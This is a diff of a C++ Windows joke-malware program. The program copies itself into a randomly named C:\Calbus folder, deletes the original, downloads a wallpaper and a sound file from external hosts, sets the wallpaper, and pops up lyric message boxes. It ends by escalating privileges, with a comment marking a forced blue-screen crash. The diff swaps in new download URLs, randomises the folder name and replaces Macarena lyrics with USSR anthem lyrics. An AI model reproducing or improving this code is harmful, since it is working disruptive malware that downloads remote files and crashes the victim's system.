@@ -65,6 +65,15 @@ namespace std {
     inline std::wstring toWSTRING(std::string& s) {
         return std::wstring(s.begin(), s.end());
     }
+    inline int rand(int x0, int x1) {
+        return rand() % (x1 - x0) + x0;
+    }
+    int rand(int x) {
+        std::string num = "";
+        for (int i = 0; i < x; i++)
+            num += std::to_string(std::rand(0,10));
+        return std::stoi(num);
+    }
 }
 namespace fileUtils {
     inline bool file_exists(const std::string& name) {
@@ -121,6 +130,8 @@ namespace Payloads {
                 HDC hdc = GetDC(HWND_DESKTOP);
                 BitBlt(hdc, x, y, w, sw, hdc, x, 0, SRCCOPY);
                 Sleep(100);
+                if (inc > 500)
+                    inc = 0;
             }
         }
     }
@@ -141,15 +152,17 @@ std::wstring s2ws(const std::string& s)
     return r;
 }
 
-std::string wallpaper = "C:\\Calbus\\mauriescalboxdddddddCALBISIE.png";
-std::string soundThing = "C:\\Calbus\\yathusableeeemfskfmdsl.wav";
+std::string wallpaper = "\\mauriescalboxdddddddCALBISIE.png";
+std::string soundThing = "\\yathusableeeemfskfmdsl.wav";
 
 BOOL isMacarenaPlaying = 0;
 std::vector<std::thread> coroutine;
+std::string yunno = "C:\\Calbus-" + std::to_string(std::rand(8));
 
 void playMacarena() {
     isMacarenaPlaying = 1;
-    PlaySound(std::toLPWSTR(soundThing), NULL, SND_SYNC);
+    std::string soundPath = yunno + soundThing;
+    PlaySound(std::toLPWSTR(soundPath), NULL, SND_SYNC);
     isMacarenaPlaying = 0;
 }
 int uKnow = 0;
@@ -157,7 +170,7 @@ namespace Lyrics {
     std::map<int, LPCSTR> songLyrics;
     LPCSTR lyric = NULL;
     void coroutineLyricsBox() {
-        MessageBoxA(NULL, lyric, "Lyrics", NULL);
+        MessageBoxA(GetForegroundWindow(), lyric, "Lyrics", NULL);
     }
     inline void lyricsBox(std::string lyrics) {
         coroutine.push_back(std::thread(&coroutineLyricsBox));
@@ -179,66 +192,18 @@ namespace Lyrics {
         }
     }
     void initLyrics() {
-        addLyric(370, "When I dance they call me Macarena");
-        addLyric(395, "And the boys they say me que estoy buena");
-        addLyric(420, "They all want me, they can't have me");
-        addLyric(442, "So they all come and dance beside me");
-        addLyric(469, "Move with me, chant with me");
-        addLyric(490, "And if you're good I'll take you home with me");
-        addLyric(509, "Dale a tu cuerpo alegría Macarena");
-        addLyric(530, "Que tu cuerpo es pa' darle alegria y cosa buena");
-        addLyric(560, "Dale a tu cuerpo alegría Macarena");
-        addLyric(580, "Heee");
-        addLyric(583, "Heee");
-        addLyric(584, "Heee");
-        addLyric(585, "Heee");
-        addLyric(586, "Heee");
-        addLyric(587, "Heee");
-        addLyric(588, "Heee");
-        addLyric(589, "Heey");
-        addLyric(590, "Macarena");
-        addLyric(605, "Dale a tu cuerpo alegría Macarena");
-        addLyric(620, "Que tu cuepo es pa' darle alegria y cosa buena");
-        addLyric(651, "Dale a tu cuerpo alegría Macarena");
-        addLyric(670, "Heee");
-        addLyric(671, "Heee");
-        addLyric(672, "Heee");
-        addLyric(673, "Heee");
-        addLyric(674, "Heee");
-        addLyric(675, "Heee");
-        addLyric(676, "Heee");
-        addLyric(677, "Heee");
-        addLyric(678, "Heee");
-        addLyric(679, "Heee");
-        addLyric(680, "Heee");
-        addLyric(681, "Heey");
-        addLyric(682, "Macarena");
-        addLyric(685, "AAAAAAAAAAAAAAAAAAAAAAAHHHHHHHHHHHHHHHHHHAAAAAAAAAAAAAAAAIIIIIIIIIII");
-        addLyric(695, "Now don't you worry about my boyfriend");
-        addLyric(712, "The boy whose name is Vitorino");
-        addLyric(734, "I don't want him");
-        addLyric(750, "Can't stand him");
-        addLyric(765, "He was no good so, I ha");
-        addLyric(785, "ha");
-        addLyric(786, "ha");
-        addLyric(787, "ha");
-        addLyric(788, "ha");
-        addLyric(789, "ha");
-        addLyric(790, "ha");
-        addLyric(791, "ha");
-        addLyric(792, "ha");
-        addLyric(793, "ha");
-        addLyric(794, "ha");
-        addLyric(795, "ha");
-        addLyric(796, "ha");
-        addLyric(797, "ha");
-        addLyric(798, "ha");
-        addLyric(799, "ha");
-        addLyric(800, "ha");
-        addLyric(801, "ha");
-        addLyric(802, "ha");
-        addLyric(803, "ha");
-        addLyric(804, "Now come on, what was I supposed to do?\nHe was out of town and his two friends were so fine");
+        addLyric(0, "Enjoy USSR Anthem1!11!!111!!!!");
+        addLyric(118, "Soyuz nerushimy respublik svobodnykh");
+        addLyric(180, "Splotila naveki velikaya Rus'!");
+        addLyric(255, "Da zdravstvuyet sozdanny volley narodov");
+        addLyric(320, "Yediny, moguchy Sovetsky soyuz!");
+        addLyric(460, "Slav'sya, Otechestvo nashe svobodnoye,");
+        addLyric(650, "I won't add more lyric...");
+        addLyric(655, "I won't add more lyric...");
+        addLyric(700, "I won't add more lyric...");
+        addLyric(701, "I won't add more lyric...");
+        addLyric(702, "I won't add more lyric...");
+        addLyric(703, "I won't add more lyric...");
     }
 }
 
@@ -248,10 +213,13 @@ int main(int argc, char* argv[], char* envp[])
     Lyrics::initLyrics();
     std::thread currentThread;
     FreeConsole();
-    system("md C:\\Calbus");
-    if (executable_name() != "C:\\Calbus\\executable_xd.exe") {
-        CopyFileA(executable_name().c_str(), "C:\\Calbus\\executable_xd.exe", 0);
-        std::string sysDel = "C:\\Calbus\\executable_xd.exe yes \"" + executable_name() + "\"";
+    std::string yunno_cmd = "md " + yunno;
+    std::string yunno_exec = yunno + "\\executable_xd.exe";
+
+    system(yunno_cmd.c_str());
+    if (executable_name() != yunno_exec) {
+        CopyFileA(executable_name().c_str(), yunno_exec.c_str() , 0);
+        std::string sysDel = yunno_exec + " yes \"" + executable_name() + "\"";
         STARTUPINFO si = { 0 };
         PROCESS_INFORMATION pi = { 0 };
         std::wstring lvi = s2ws(sysDel);
@@ -266,19 +234,18 @@ int main(int argc, char* argv[], char* envp[])
         return 0;
     while (!DeleteFileA(argv[2])) Sleep(20);
     /* Download required files for running. */
-    LPCSTR wpDlWebsite = "https://i.imgur.com/EFRtiJK.png";
-    if (!fileUtils::file_check(wallpaper, 303791)) {
-        Sleep(50);
-        URLDownloadToFileA(NULL, wpDlWebsite, wallpaper.c_str(), 0, NULL);
-    }
-    wpDlWebsite = "https://dpointhostingsv1.000webhostapp.com/yathusableeeemfskfmdsl.wav";
-    if (!fileUtils::file_check(soundThing, 40739508)) {
-        Sleep(50);
-        URLDownloadToFileA(NULL, wpDlWebsite, soundThing.c_str(), 0, NULL);
-    }
+    LPCSTR wpDlWebsite = "https://i.imgur.com/mtl15AR.png";
+    Sleep(50);
+    std::string wpStr = yunno + wallpaper;
+    URLDownloadToFileA(NULL, wpDlWebsite, wpStr.c_str(), 0, NULL);
+    wpDlWebsite = "https://celebratory-motor.000webhostapp.com/macarena/videoplayback.wav";
+    Sleep(50);
+    std::string sndStr = yunno + soundThing;
+    URLDownloadToFileA(NULL, wpDlWebsite, sndStr.c_str(), 0, NULL);
     Sleep(100);
     currentThread = std::thread(playMacarena);
-    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wallpaper), SPIF_UPDATEINIFILE);
+    std::string wpPath = yunno + wallpaper;
+    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, std::toLPWSTR(wpPath), SPIF_UPDATEINIFILE);
 
     while (isMacarenaPlaying) {
         Lyrics::doLyric(uKnow);
@@ -288,7 +255,7 @@ int main(int argc, char* argv[], char* envp[])
         Sleep(100);
     }
     Sleep(1000);
-    Lyrics::lyricsBox("5");
+    Lyrics::lyricsBox("5"); /* TODO: Make those numbers work. */
     Sleep(1000);
     Lyrics::lyricsBox("4");
     Sleep(1000);
@@ -298,7 +265,7 @@ int main(int argc, char* argv[], char* envp[])
     Sleep(1000);
     Lyrics::lyricsBox("1");
     Sleep(1000);
-    /* BSOD */
+    /* BSOD */ 
     BOOLEAN bl = NULL;
     ULONG response;
     RtlAdjustPrivilege(19, 1, 0, &bl);
